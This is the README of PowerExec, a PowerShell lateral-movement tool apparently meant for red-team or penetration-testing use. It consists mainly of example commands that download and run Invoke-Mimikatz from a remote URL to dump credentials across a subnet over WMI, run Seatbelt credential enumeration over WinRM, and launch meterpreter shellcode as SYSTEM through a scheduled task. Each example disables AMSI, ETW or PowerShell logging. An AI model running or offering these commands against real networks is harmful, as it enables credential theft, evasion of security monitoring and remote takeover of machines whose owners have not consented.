# PowerExec

PowerExec is a PowerShell tool to move laterally on a Windows network.

## Functions

```
Invoke-PowerExec                -   execute PowerShell script block on remote computers through various methods
New-PowerLoader                 -   build script block which safely loads PowerShell, .NET assembly or shellcode
```

## Examples

Run a PowerShell script through WMI using a download cradle while bypassing Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW):

```
PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Method WMI -Threads 10
```

Run a .NET assembly through WinRM while bypassing AMSI, Script Block Logging (SBL) and PowerShell Module Logging (PML):

```
PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,SBL,PML | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Method WinRM
```

Run a shellcode through a scheduled task as NT AUTHORITY\SYSTEM while bypassing AMSI :

```
PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin -Bypass AMSI | Invoke-PowerExec -ComputerList 192.168.1.1 -Method SchTask
```

## Credits

  * https://rastamouse.me/blog/asb-bypass-pt3/
  * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  * https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
  * https://blog.xpnsec.com/hiding-your-dotnet-etw
  * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
